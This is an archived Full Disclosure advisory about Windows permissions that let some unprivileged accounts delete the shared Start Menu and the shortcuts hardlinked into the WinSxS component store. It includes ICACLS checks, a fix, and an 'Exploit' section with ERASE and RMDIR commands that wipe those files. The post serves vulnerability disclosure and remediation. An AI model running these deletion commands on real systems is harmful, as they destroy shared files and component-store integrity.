---
title: Defense in depth -- the Microsoft way (part 95): the (shared)	"Start Menu" is dispensable
url: https://seclists.org/fulldisclosure/2026/Jan/18
source: Full Disclosure
date: 2026-01-11
fetch_date: 2026-01-12T03:37:54.465655
---

# Defense in depth -- the Microsoft way (part 95): the (shared)	"Start Menu" is dispensable

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# Defense in depth -- the Microsoft way (part 95): the (shared) "Start Menu" is dispensable

---

*From*: Stefan Kanthak via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 8 Jan 2026 12:40:10 +0100

---

```
Hi @ll,

the following is a condensed form of
<https://skanthak.hier-im-netz.de/whispers.html#whisper3> and
<https://skanthak.hier-im-netz.de/whispers.html#whisper4>.

Windows Vista moved the shared start menu from "%ALLUSERSPROFILE%\Start Menu\"
to "%ProgramData%\Microsoft\Windows\Start Menu\", with some shortcuts (*.lnk)
"reflected" from the (immutable) component store below %SystemRoot%\WinSxS\

JFTR: "reflection" is M$FT lingo for hardlink into the component store.

Before this move only Administrators had write access to the shared start menu;
afterwards at least the user account(s) created during Windows setup (OOBE,
out of box experience) are granted DELETE and DELETE_CHILD access permission.

Demonstration
~~~~~~~~~~~~~

Log on to an arbitrary (unprivileged) user account, start the command processor
and run the following command line to display the access permissions of the
shared start menu:

ICACLS.EXE "%ProgramData%\Microsoft\Windows\Start Menu"

| C:\ProgramData\Microsoft\Windows\Start Menu COMPUTER\User:(OI)(CI)(IO)(DE,DC)
|                                             S-1-5-21-xxx-yyy-zzz-1000:(OI)(CI)(IO)(DE,DC)
|                                             COMPUTER\Administrator:(OI)(CI)(IO)(DE,DC)
|                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
|                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
|                                             BUILTIN\Users:(I)(OI)(CI)(RX)
|                                             Everyone:(I)(OI)(CI)(RX)

Instead of "COMPUTER" you get your computer name (see the environment variables
%COMPUTERNAME% and %USERDOMAIN%); instead of "User" and "Administrator" you get
the first/primary and the localized administrator account name.

"(OI)(CI)(IO)(DE,DC)" means "inherit DELETE and DELETE CHILD access permission
to all objects/files and containers/directories below this directory".

Run the following command line to confirm the latter:

ICACLS.EXE "%ProgramData%\Microsoft\Windows\Start Menu" /C /Q /T | FINDSTR.EXE /L "%ProgramData% (DE,DC)"

"Thanks" to the braindead "reflection" of shortcuts (generally: files) from
the component store their access permissions are changed too:

ICACLS.EXE "%SystemRoot%\WinSxS\*.lnk" /C /Q /T | FINDSTR.EXE /L "%SystemRoot% (DE,DC)"

Exploit
~~~~~~~

"Thanks" to the DELETE_CHILD access permission some unprivileged users can
since NINETEEN years remove the shared start menu COMPLETELY!

ERASE /A:HS /F /Q /S "%ProgramData%\Microsoft\Windows\Start Menu\desktop.ini"
ERASE /F /Q /S "%ProgramData%\Microsoft\Windows\Start Menu\*.lnk"
RMDIR /Q /S "%ProgramData%\Microsoft\Windows\Start Menu"

"Thanks" to the braindead "reflection" of shortcuts (generally: files) from
the component store the same unprivileged users can also erase them there
and destroy the integrity of the component store:

ERASE /F /Q /S "%SystemRoot%\WinSxS\*.lnk"

Fix
~~~

Remove the SUPERFLUOUS access permissions (needs SE_RESTORE_PRIVILEGE):

ICACLS.EXE "%ProgramData%\Microsoft\Windows\Start Menu" /C /Q /Remove:g "%USERDOMAIN%\Administrator"
"%USERDOMAIN%\%USERNAME%"
"%USERDOMAIN%\User" *S-1-5-21-xxx-yyy-zzz-RID ... /T
ICACLS.EXE "%SystemRoot%\WinSxS\*.lnk" /C /Q /Remove:g "%USERDOMAIN%\Administrator" "%USERDOMAIN%\%USERNAME%"
"%USERDOMAIN%\User"
*S-1-5-21-xxx-yyy-zzz-RID ... /T

stay tuned, and far away from unprotected system( file)s
Stefan Kanthak

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
![Next](/images/right-icon-16x16.png)

### Current thread:

* **Defense in depth -- the Microsoft way (part 95): the (shared) "Start Menu" is dispensable** *Stefan Kanthak via Fulldisclosure (Jan 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")